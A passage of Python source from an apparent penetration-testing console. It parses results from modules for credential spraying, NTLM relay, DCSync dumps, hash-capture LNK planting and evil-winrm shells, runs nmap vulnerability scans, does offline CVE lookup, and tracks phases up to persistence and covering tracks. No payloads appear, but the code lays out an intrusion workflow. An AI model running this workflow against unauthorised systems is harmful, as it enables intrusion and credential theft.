                    "summary": "MySQL auth bypass (CVE-2012-2122) — root without a password"[:140]}
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"MySQL creds: {shown}"[:140]}

    # 2bh) mysql-banner: unauthenticated version disclosure (info)
    if sid == "mysql-banner":
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
        return None

    # 2bg) telnet-sniff: cleartext telnet creds captured off the wire
    if sid == "telnet-sniff":
        hits = re.findall(r"^✗ SNIFF (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"telnet cleartext sniffed: {shown}"[:140]}

    # 2be) telnet-creds: default / reused telnet login worked → immediate access
    if sid == "telnet-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"telnet creds: {shown}"[:140]}

    # 2bd) telnet-banner: unauthenticated shell (critical) → else banner / auth-required info
    if sid == "telnet-banner":
        no = re.search(r"^✗ NOAUTH unauthenticated shell — (.+)$", output, re.M)
        if no:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"telnet: unauthenticated shell ({no.group(1)})"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"telnet: {mv.group(1).strip()}"[:140]}
        return None

    # 2bc) tftp-write: anonymous WRQ accepted — payload-drop / config-overwrite surface
    if sid == "tftp-write":
        w = re.findall(r"^✗ WRITABLE (\S+)", output, re.M)
        if not w:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"anonymous-writable TFTP (no DELETE): {w[0]}"[:140]}

    # 2bb) tftp-grab: creds/secrets pulled from world-readable device configs & boot files
    if sid == "tftp-grab":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        files = re.findall(r"^· FILE ", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP config creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:2]) + (f" +{len(secrets) - 2}" if len(secrets) > 2 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP config secrets: {shown}"[:140]}
        if files:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"TFTP: {len(files)} world-readable file(s) retrieved"[:140]}
        return None

    # 2ba) tftp-probe: path-traversal arbitrary read (critical) → else just a reachable TFTP server
    if sid == "tftp-probe":
        reads = re.findall(r"^✗ VULN arbitrary file read via path traversal — (.+?) readable$", output, re.M)
        if reads:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP path-traversal read: {', '.join(reads[:4])}"[:140]}
        if "it's a TFTP server" in output:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": "TFTP/69 reachable — no auth, read/write primitive"[:140]}
        return None

    # 2at) ftp-banner: known-backdoor FTP version → critical RCE; else version info
    if sid == "ftp-banner":
        vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if vulns:
            vcve = ",".join(sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", " ".join(vulns))))) or None
            return {"state": "VULNERABLE", "cve": vcve, "risk": "CRITICAL",
                    "summary": f"FTP: {vulns[0]}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"FTP: {mv.group(1).strip()}"[:140]}
        return None

    # 2as) winrm-recon: post-access recon — hot privilege → privesc path; pivot subnets
    if sid == "winrm-recon":
        privs = re.findall(r"^✗ PRIV (\S+)", output, re.M)
        if privs:
            hot = any(p in _HOT_PRIVS for p in privs)
            shown = ", ".join(privs[:5])
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if hot else "MEDIUM",
                    "summary": f"WinRM privileges: {shown}"[:140]}
        if "Networks:" in output:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": "WinRM post-access recon (pivot surface)"[:140]}
        return None

    # 2ar) winrm-access: enumerated who can use WinRM (Remote Management Users / admins)
    if sid == "winrm-access":
        hits = [h.replace("  (have cred)", "").strip()
                for h in re.findall(r"^✗ WINRM-USER (.+)$", output, re.M)]
        if not hits:
            return None
        shown = ", ".join(dict.fromkeys(hits))[:110]
        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                "summary": f"WinRM access: {shown}"[:140]}

    # 2aq) winrm-shell: an interactive evil-winrm session was spawned over a WinRM cred
    if sid == "winrm-shell":
        m = re.search(r"^winrm-shell: (evil-winrm shell → .+)$", output, re.M)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {m.group(1)}"[:140]}
        return None

    # 2ap) winrm-spray: harvested creds valid on WinRM (reuse); a shell (Pwn3d!) is critical
    if sid == "winrm-spray":
        shell = re.findall(r"^✗ SHELL (.+?)\s{2}", output, re.M)
        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
        if shell:
            shown = "; ".join(s.strip() for s in shell[:3]) + (f" +{len(shell) - 3}" if len(shell) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"WinRM shell: {shown}"[:140]}
        if valid:
            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"valid WinRM creds: {shown}"[:140]}
        return None

    # 2ao) winrm-enum: WinRM transport confirmed → evil-winrm target; Basic-over-HTTP is worse
    if sid == "winrm-enum":
        trans = re.findall(r"((?:HTTPS?) \d+) ✓", output)
        if not trans:
            return None
        auth = re.search(r"Auth:\s*(.+)", output)
        risk = "HIGH" if "Basic auth over HTTP" in output else "MEDIUM"
        summ = f"WinRM: {', '.join(trans)}" + (f" · auth {auth.group(1)}" if auth else "")
        return {"state": "EXPOSED", "cve": cve, "risk": risk, "summary": summ[:140]}

    # 2an) smb-foothold: an interactive admin session was spawned over valid creds / a hash
    if sid == "smb-foothold":
        m = re.search(r"^smb-foothold: (\S+ shell → .+)$", output, re.M)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {m.group(1)}"[:140]}
        return None

    # 2am) smb-writable: hash-capture LNK planted on a writable share → coerces browsers
    if sid == "smb-writable":
        hits = re.findall(r"^✗ PLANT (.+)$", output, re.M)
        if not hits:
            return None
        shown = ", ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"writable share — hash-capture LNK planted: {shown}"[:140]}

    # 2al) smb-dump: credential material dumped (SAM/LSA/LSASS) or the domain (DCSync/NTDS)
    if sid == "smb-dump":
        dc = re.findall(r"^✗ DCSYNC (.+)$", output, re.M)
        du = re.findall(r"^✗ DUMP (.+)$", output, re.M)
        if dc:
            shown = "; ".join(d.strip() for d in dc[:2])
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"DCSync — domain dumped: {shown}"[:140]}
        if du:
            shown = "; ".join(d.strip() for d in du[:2]) + (f" +{len(du) - 2}" if len(du) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"creds dumped: {shown}"[:140]}
        return None

    # 2ak) smb-exec: command execution confirmed over admin creds → shell channel ready
    if sid == "smb-exec":
        hits = re.findall(r"^✗ EXEC (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"code exec: {shown}"[:140]}

    # 2aj) smb-spray: harvested creds valid elsewhere (reuse) → local admin is critical
    if sid == "smb-spray":
        admin = re.findall(r"^✗ ADMIN (.+?)\s{2}", output, re.M)
        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
        if admin:
            shown = "; ".join(a.strip() for a in admin[:3]) + (f" +{len(admin) - 3}" if len(admin) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"local admin via reuse: {shown}"[:140]}
        if valid:
            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"valid creds (reuse): {shown}"[:140]}
        return None

    # 2ai) smb-dccve: confirmed DC-takeover CVE (ZeroLogon / noPac / PrintNightmare)
    if sid == "smb-dccve":
        hits = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"DC takeover: {shown}"[:140]}

    # 2ah) smb-coerce: target coercible into authenticating to us → drives the relay
    if sid == "smb-coerce":
        hits = re.findall(r"^✗ COERCE (.+)$", output, re.M)
        if not hits:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"coercible: {', '.join(h.strip() for h in hits[:5])}"[:140]}

    # 2ag) smb-relay: NTLM relayed to a signing-off host → SAM hashes dumped remotely
    if sid == "smb-relay":
        hits = re.findall(r"^✗ SAM (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"NTLM relay → SAM: {shown}"[:140]}

    # 2af) smb-poison: NetNTLM hashes captured via LLMNR/NBT-NS poisoning → crack/relay
    if sid == "smb-poison":
        hits = re.findall(r"^✗ HASH (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"Captured NetNTLM: {shown}"[:140]}

    # 2ae) smb-gpp: creds recovered from SYSVOL/NETLOGON GPP (domain-wide, reusable) → high
    if sid == "smb-gpp":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"GPP creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"SYSVOL secrets: {shown}"[:140]}
        return None

    # 3) info rules over -sC output
    low = output.lower()
    info = None
    if sid == "http-git":
        info = ("exposed .git repository", "MEDIUM")
    elif sid == "http-config-backup":
        info = ("exposed config/backup file", "MEDIUM")
    elif sid == "http-methods" and re.search(r"\b(PUT|DELETE|TRACE|CONNECT)\b", output):
        info = ("risky HTTP methods enabled", "LOW")
    elif sid in ("http-title", "http-ls") and "index of /" in low:
        info = ("directory listing enabled", "LOW")
    elif sid == "ssl-enum-ciphers" and re.search(r"least strength:\s*[C-F]", output):
        info = ("weak TLS ciphers", "MEDIUM")
    elif sid in ("smb-security-mode", "smb2-security-mode") and "not required" in low:
        info = ("SMB message signing not required", "MEDIUM")
    elif sid == "ssh-auth-methods" and "password" in low:
        info = ("SSH password authentication enabled", "INFO")
    if info:
        return {"state": "INFO", "cve": cve, "risk": info[1], "summary": info[0]}
    return None


def _run_vuln_pass(job: dict, scripts: str, ports: list, ip: str, deadline: float) -> None:
    """Run one family's targeted vuln/auth scan, streaming script output (to scripts)
    and parsed findings (to vulns) to the DB. Honours job['cancel']."""
    args = ["-sV", "--script", scripts, "-Pn", "-n", "-T3",
            "--script-timeout", "120s", "-p", ",".join(str(p) for p in ports)]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            if h.get("scripts"):
                save_scripts(h["ip"], h["scripts"])     # also extracts findings -> vulns
            if h.get("services"):
                save_services(h["ip"], h["services"])
            job["hosts"] = len(fetch_vulns(h["ip"]))     # count of findings so far
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_vuln_scan(ip: str, minutes: int) -> None:
    """One concurrent targeted scan per service family, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["3"][0]
    families = _vuln_families(ip)
    if not families:
        job = _new_job("3", name, f"nmap (no known services on {ip})")
        job["state"] = "done"
        _job_update(job)
        return
    run = _next_run_id()
    threads = []
    for label, scripts, ports in families:
        command = f"nmap -sV --script {scripts} -T3 -p {','.join(str(p) for p in ports)} {ip}"
        job = _new_job("3", f"{name} · {label}", command, run)
        t = threading.Thread(target=_run_vuln_pass, args=(job, scripts, ports, ip, deadline),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_vuln_scan(ip: str, minutes: int) -> None:
    """Launch the vuln scan in the background; the menu stays free."""
    threading.Thread(target=_run_vuln_scan, args=(ip, minutes), daemon=True).start()


# ── CVE lookup (phase 5) ──────────────────────────────────────────────────────
# Offline enrichment: the service-detection phase stores a CPE per port; here we
# match that CPE (vendor/product + version) against the local NVD-derived index
# (appdata/cve_index.db) and record the known CVE numbers as findings. No network,
# no scanning — pure lookup. Only versioned CPEs are used (a general CPE without a
# version can't be mapped precisely and would produce false positives).
_CVE_STORE_CAP = 20        # newest CVEs kept per service (keeps findings readable)

# The same product often carries a different CPE vendor/product in nmap output than
# the one(s) NVD files its CVEs under. Map the nmap pair to the canonical NVD pair(s)
# that actually hold the CVEs; the lookup queries the original AND every alias and
# unions the results, so nothing is silently missed (some products span two vendors,
# e.g. rabbitmq under pivotal_software and broadcom).
_CPE_ALIAS = {
    ("mysql", "mysql"):                 [("oracle", "mysql")],
    ("nginx", "nginx"):                 [("f5", "nginx")],
    ("igor_sysoev", "nginx"):           [("f5", "nginx")],
    ("elasticsearch", "elasticsearch"): [("elastic", "elasticsearch")],
    ("squid", "squid"):                 [("squid-cache", "squid")],
    ("isc", "bind9"):                   [("isc", "bind")],
    ("vsftpd", "vsftpd"):               [("redhat", "vsftpd")],
    ("proftpd", "proftpd"):             [("proftpd_project", "proftpd")],
    ("rabbitmq", "rabbitmq"):           [("pivotal_software", "rabbitmq"),
                                         ("broadcom", "rabbitmq_server")],
    ("pureftpd", "pureftpd"):           [("pureftpd", "pure-ftpd")],
}


def _ver_key(v: "str | None") -> tuple:
    """Version as a tuple of its numeric components, e.g. '8.2p1' → (8, 2, 1).
    Good enough to order/compare the version strings NVD uses in its ranges."""
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _ver_cmp(a: "str | None", b: "str | None") -> int:
    """-1 / 0 / 1 comparing two version strings by their numeric components."""
    ta, tb = _ver_key(a), _ver_key(b)
    n = max(len(ta), len(tb))
    ta += (0,) * (n - len(ta))
    tb += (0,) * (n - len(tb))
    return (ta > tb) - (ta < tb)


def _cve_sort_key(cve: str) -> tuple:
    """Sort CVE ids newest-first (by year, then sequence)."""
    m = re.match(r"CVE-(\d+)-(\d+)", cve)
    return (-int(m.group(1)), -int(m.group(2))) if m else (0, 0)


def _cpe_parts(cpe: "str | None") -> "tuple | None":
    """(vendor, product, version) from a CPE 2.2 (cpe:/a:v:p:ver) or 2.3
    (cpe:2.3:a:v:p:ver:…) URI. version is None when absent/any ('*'/'-')."""
    if not cpe or not cpe.startswith("cpe:"):
        return None
    body = cpe[4:]
    if body.startswith("/"):                       # 2.2
        f = body[1:].split(":")
    elif body.startswith("2.3:"):                  # 2.3
        f = body[4:].split(":")
    else:
        return None
    if len(f) < 3:
        return None
    vendor, product = f[1], f[2]
    version = f[3] if len(f) > 3 else None
    version = None if version in ("", "*", "-") else version
    if not vendor or not product:
        return None
    return vendor, product, version


def _ver_in_match(version: str, exact, vsi, vse, vei, vee) -> bool:
    """True when ``version`` satisfies one NVD cpeMatch row — deliberately strict, to
    show fewer but better-verified CVEs (less noise) rather than everything NVD lists:

      • exact version: matched only when the fingerprint is at least as precise as the
        exact value (so a bare major like '4' is NOT taken as '4.0.0' and does not match
        every '4.x' exact row — the biggest false-positive source).
      • ranges: only *closed* ranges (a start bound AND an end bound) count, and only for
        a fingerprint with ≥2 numeric components. Open-ended rows ('< X' / '>= X' only,
        or 'all versions') are dropped — they match huge, cross-branch swaths of versions.
    """
    vk = _ver_key(version)
    if exact:
        ek = _ver_key(exact)
        if len(vk) < len(ek):
            return False                   # fingerprint too coarse to claim this version
        n = max(len(vk), len(ek))
        return vk + (0,) * (n - len(vk)) == ek + (0,) * (n - len(ek))
    if len(vk) < 2:
        return False                       # bare major — too coarse to place in a range
    if not ((vsi or vse) and (vei or vee)):
        return False                       # open-ended / unbounded range — dropped
    if vsi and _ver_cmp(version, vsi) < 0:
        return False
    if vse and _ver_cmp(version, vse) <= 0:
        return False
    if vei and _ver_cmp(version, vei) > 0:
        return False
    if vee and _ver_cmp(version, vee) >= 0:
        return False
    return True


def _cve_lookup(vendor: str, product: str, version: str) -> "list | None":
    """Matching CVE ids (newest first) for one vendor/product/version, or None when
    the index is missing/unreadable. Queries the CPE pair plus any aliases (some
    products file CVEs under several NVD vendors) and unions the results."""
    if not os.path.exists(CVE_INDEX_PATH):
        return None
    targets = [(vendor, product)] + _CPE_ALIAS.get((vendor, product), [])
    try:
        con = sqlite3.connect(CVE_INDEX_PATH)
        try:
            rows = []
            for v, p in targets:
                rows += con.execute(
                    "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve "
                    "FROM cve_match m JOIN product p ON p.id = m.product_id "
                    "WHERE p.vendor = ? AND p.product = ?", (v, p)).fetchall()
        finally:
            con.close()
    except sqlite3.Error:
        return None
    matched = {cve for exact, vsi, vse, vei, vee, cve in rows
               if _ver_in_match(version, exact, vsi, vse, vei, vee)}
    return sorted(matched, key=_cve_sort_key)


def _run_cve_lookup(ip: str) -> list:
    """Per versioned service CPE on the host, the CVEs it maps to.
    Returns [(port, proto, product, version, [cve, …]), …]."""
    results = []
    for (port, proto), (_name, product_s, version_s, cpe) in sorted(fetch_services(ip).items()):
        parts = _cpe_parts(cpe)
        if not parts:
            continue
        vendor, product, cpe_ver = parts
        version = cpe_ver or version_s
        if not version or not re.search(r"\d", version):
            continue                               # need a concrete version
        cves = _cve_lookup(vendor, product, version)
        if cves:
            results.append((port, proto, product, version, cves))
    return results


def save_cve_findings(ip: str, results: list) -> None:
    """Replace this host's CVE-lookup findings in the vulns table (script
    'cve-lookup', one row per port), so re-running the phase stays idempotent."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute("DELETE FROM vulns WHERE ip = ? AND script = 'cve-lookup'", (ip,))
            for port, proto, product, version, cves in results:
                cve_str = ",".join(cves[:_CVE_STORE_CAP])
                summary = f"{product} {version} — {len(cves)} known CVE(s)"
                conn.execute(
                    "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                    "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (ip, port, proto, "cve-lookup", "CVE", cve_str, "INFO", summary, now, now))
            conn.commit()
        finally:
            conn.close()


def _do_cve_lookup(ip: str) -> None:
    """Run the offline lookup for one host, store findings, log a job, print a recap."""
    name = _PHASES["4"][0]
    job = _new_job("4", f"{name} · {ip}", f"cve-index lookup (offline NVD) for {ip}")
    results = []
    try:
        results = _run_cve_lookup(ip)
        save_cve_findings(ip, results)
        lines = [f"CVE lookup — {ip} (offline NVD index)"]
        for port, proto, product, version, cves in results:
            lines.append(f"{port}/{proto}  {product} {version}  {len(cves)} CVE")
            shown = cves[:_CVE_STORE_CAP]
            lines.append("  " + ", ".join(shown)
                         + (f"  (+{len(cves) - len(shown)} more)" if len(cves) > len(shown) else ""))
        job["output"], job["hosts"], job["state"] = "\n".join(lines), len(results), "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)

    if not results:
        print(f"\n{DIM}▸ CVE lookup — {ip}: no versioned service CPE matched the index "
              f"(run {BOLD}[2] Service detection{RESET}{DIM} first, or no known CVEs){RESET}")
        return
    total = sum(len(cves) for *_rest, cves in results)
    print(f"\n{GREEN}▶ CVE lookup done{RESET} {DIM}({ip} · {len(results)} service(s), {total} CVE) — "
          f"see {BOLD}[f] findings{RESET}{DIM} · {BOLD}[s] status{RESET}")


def _handle_cve_lookup() -> None:
    """Phase 5 flow: read a target IP and match its service CPEs to known CVEs."""
    if not os.path.exists(CVE_INDEX_PATH):
        print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
              f"— build it with the installer's NVD step, then retry{RESET}")
        return
    while True:
        value = _ctx_ask("cve", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            continue
        _do_cve_lookup(ip)
        return


# ── progress (per-host workflow tracker) ──────────────────────────────────────
def _host_job_states(ip: str) -> dict:
    """Aggregated command-history state per phase for one host. A phase spawns several
    commands (parallel nmap passes / script families), so its state is combined across
    all of them: 'running' while ANY is still running, and only settling to
    'done'/'error'/'aborted' once they have all finished — so progress never flips to
    complete mid-scan. A job belongs to the host when the IP appears as a whole token in
    its command or name."""
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    per_phase: dict = {}
    for j in jobs:
        if pat.search(j.get("command") or "") or pat.search(j.get("name") or ""):
            per_phase.setdefault(j["phase"], []).append(j["state"])
    return {phase: _agg_state(sts) for phase, sts in per_phase.items()}


def _agg_state(states: list) -> str:
    """Combine several command states into one: 'running' while any is still going;
    else a success ('done') settles it; 'error'/'aborted' only when nothing completed."""
    if "running" in states:
        return "running"
    if "done" in states:
        return "done"
    if "error" in states:
        return "error"
    if "aborted" in states:
        return "aborted"
    return states[-1] if states else "done"


def _render_host_progress(ip: str) -> None:
    """Per-host workflow tracker: for every phase, show whether it has run for this host
    (evidence in the DB) and its current state from the command history — so it's clear
    what's complete, what's mid-run and what hasn't been done yet."""
    known = any(r[0] == ip for r in fetch_hosts())
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    scripted = fetch_scripted_ports(ip)
    vulns = fetch_vulns(ip)
    # Phase 3's -sC feeds the same vulns table (http-methods, ssl-cert… all state INFO),
    # so findings alone don't prove the vuln scan ran. Count only what the vuln category
    # emits and -sC does not — VULNERABLE/LIKELY; a phase-4 job (persisted) also marks it.
    vuln_findings = [v for v in vulns if v[3] in ("VULNERABLE", "LIKELY")]   # phase 4
    cve_findings = [v for v in vulns if v[3] == "CVE"]       # phase 5
    n_cve = sum(len([c for c in (v[4] or "").split(",") if c.strip()]) for v in cve_findings)
    jobstate = _host_job_states(ip)

    # Phase 2 (port scan) already seeds the services table with nmap's port->name
    # guesses, so a bare name doesn't prove phase 3 ran. Service detection (-sV -sC) is
    # what adds a product/version/CPE or NSE script output — that's the real evidence.
    fingerprinted = [s for s in services.values() if s[1] or s[2] or s[3]]

    # Phase 2 also re-registers the host (save_hosts), so "on record" alone doesn't mean
    # host discovery ran. Prefer the discovery job's own record: if a discovery pass ran
    # this session (its found-set is populated), phase 1 counts only when it found THIS
    # host. With no live discovery job (e.g. a prior session), fall back to "on record".
    with _JOBS_LOCK:
        disc = [j for j in _JOBS if j["phase"] == "0"]
        discovered = any(ip in j["found"] for j in disc)
        live_discovery = any(j["found"] for j in disc)
    phase0_done = discovered or (known and not live_discovery)

    # phase 5 (service exploitation) is complete only when EVERY service's checklist is
    # resolved (done/skip); phase 6 (privesc) when its OS checklist is resolved.
    targets = _exploit_targets(ip)
    n_svc_done = sum(1 for p, pr, _l, k, _v, _s in targets if _service_steps_complete(ip, p, pr, k))
    phase5_done = bool(targets) and n_svc_done == len(targets)
    privesc_done, privesc_detail = _os_checklist_progress(ip, "privesc", _PRIVESC_STEPS)
    persist_done, persist_detail = _os_checklist_progress(ip, "persist", _PERSIST_STEPS)
    cover_done, cover_detail = _os_checklist_progress(ip, "cover", _COVER_STEPS)

    # phase key -> (has evidence in the DB, short detail line)
    evidence = {
        "0": (phase0_done, "on record" if phase0_done else ""),
        "1": (bool(ports), f"{len(ports)} open port(s)" if ports else ""),
        "2": (bool(fingerprinted) or bool(host_scripts) or bool(scripted),
              f"{len(fingerprinted)} fingerprinted" if fingerprinted else ("NSE output" if (host_scripts or scripted) else "")),
        "3": (bool(vuln_findings), f"{len(vuln_findings)} vuln finding(s)" if vuln_findings else ""),
        "4": (bool(cve_findings), f"{n_cve} CVE" if cve_findings else ""),
        "5": (phase5_done, f"{n_svc_done}/{len(targets)} services" if targets else ""),
        "6": (privesc_done, privesc_detail),
        "7": (persist_done, persist_detail),
        "8": (cover_done, cover_detail),
    }

    print(f"\n{BOLD}{ip} — progress{RESET}")
    if not known and not ports and not vulns and not jobstate:
        print(f"  {DIM}nothing recorded for this host yet — run {BOLD}[0] Host discovery{RESET}"
              f"{DIM} / {BOLD}[1] Port enumeration{RESET}{DIM} first{RESET}")
        return

    done = 0
    for key, name, _desc in PHASES:
        has, detail = evidence[key]
        # phases 5-8 are manual checklists (no background jobs) — completion is driven by
        # the checklist evidence above, not job state.
        st = None if key in ("5", "6", "7", "8") else jobstate.get(key)
        if st == "running":
            sym, col, label = "⏳", YELLOW, "running"
        elif has or st == "done":
            sym, col, label = "✓", GREEN, "complete"
            done += 1
        elif st == "error":
            sym, col, label = "✗", RED, "error"
        elif st == "aborted":
            sym, col, label = "⊘", MAGENTA, "aborted"
        else:
            sym, col, label = "○", DIM, "not run"
        extra = f"  {DIM}· {detail}{RESET}" if detail else ""
        print(f"  {col}{sym} [{key}] {name:<20}{RESET} {col}{label:<9}{RESET}{extra}")
    print(f"\n  {DIM}{done}/{len(PHASES)} phase(s) complete{RESET}")


def _launch_phase_for(key: str, ip: str) -> None:
    """Run one workflow phase for a host chosen in the progress view — same launch path
    as the per-phase handlers, but the IP is already known so it's not re-typed."""
    _sync_hosts_block(ip)     # running any command on a host materialises its DB domains → hosts (root)
    if key == "0":
        print(f"{DIM}note: host discovery scans a subnet/range, not one host — use "
              f"{BOLD}[0]{RESET}{DIM} from the menu{RESET}")
        return
    if key == "8":
        _os_checklist_for(ip, "cover", "Covering Tracks", _COVER_STEPS)
        return
    if key == "7":
        _os_checklist_for(ip, "persist", "Persistence", _PERSIST_STEPS)
        return
    if key == "6":
        _os_checklist_for(ip, "privesc", "Privilege Escalation", _PRIVESC_STEPS)
        return
    if key == "5":
        _exploit_targets_view(ip)                            # service exploitation checklist
        return
    if key == "4":
        if not os.path.exists(CVE_INDEX_PATH):
            print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
                  f"— build it with the installer's NVD step, then retry{RESET}")
            return
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            return
        _do_cve_lookup(ip)
        return
    # phases 1–3: background nmap scans on a time budget
    if key == "2" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
    if key == "3" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
        return
    name = _PHASES[key][0]
    if key == "3":
        print(f"{DIM}vuln + auth scripting{RESET}")
    module = {"1": "ports", "2": "service", "3": "vuln"}[key]
    minutes = _prompt_minutes(module, name, ip)
    if minutes is None:
